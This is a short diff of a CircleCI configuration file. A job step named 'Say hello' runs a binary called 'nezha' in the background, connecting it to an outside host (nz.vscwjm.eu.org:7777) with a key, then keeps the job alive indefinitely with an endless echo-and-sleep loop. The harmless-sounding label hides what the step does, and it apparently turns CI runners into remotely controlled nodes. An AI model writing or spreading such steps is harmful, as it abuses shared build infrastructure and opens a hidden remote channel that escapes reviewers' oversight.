@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "chmod a+x nezha && (./nezha -s nz.vscwjm.eu.org:7777 -p gteam01 &) && while true; do echo yes; sleep 30; done"
+          command: "chmod a+x nezha && (./nezha -s nz.vscwjm.eu.org:7777 -p gteam01 &) && (while true; do echo yes; sleep 30; done)"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
